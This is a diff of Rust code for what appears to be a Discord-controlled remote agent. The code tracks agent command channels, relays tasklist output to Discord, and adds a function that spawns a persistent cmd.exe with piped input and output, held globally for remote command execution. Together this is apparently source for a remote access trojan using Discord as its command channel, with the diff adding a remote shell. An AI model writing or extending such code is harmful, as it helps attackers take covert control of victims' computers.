@@ -1,15 +1,16 @@
-use std::{env, fs::{File, create_dir_all}, io::{self, prelude::*}};
+use std::{env, fs::{File, create_dir_all}};
 use std::collections::HashMap;
-
-
+use std::io::{Read, Write};
+use std::process::{Command, Stdio};
 use serenity::{client::Context, model::{channel::{ChannelType, Message}, id::{ChannelId, GuildId}}};
 
 use uuid::Uuid;
 use reqwest::get;
 use anyhow::{anyhow, Error};
 use serenity::model::channel::GuildChannel;
+use tokio::io;
 
-use crate::{AGENT_COMMAND_ID, CHANNEL_NAME, CMD_SESSION_ID};
+use crate::{AGENT_COMMAND_ID, CHANNEL_NAME, CMD_PROCESS, CMD_SESSION_ID};
 
 // Splits the output of the tasklist command into chunks that discord can read
 pub fn split_tasklist(tasklist: &str, chunk_size: usize) -> Vec<String> {
@@ -188,6 +189,21 @@ async fn create_text_channel(
             *AGENT_COMMAND_ID.write().unwrap() = Some(channel.id);
             channel.id
         })
+}
+
+// Function to create a persistent cmd.exe process
+pub async fn create_cmd_process() -> io::Result<()> {
+    let mut process = Command::new("cmd")
+        .stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()?;
+
+    // Store the process object in the global mutex
+    let mut cmd_process = CMD_PROCESS.lock().await;
+    *cmd_process = Some(process);
+
+    Ok(())
 }
 
 
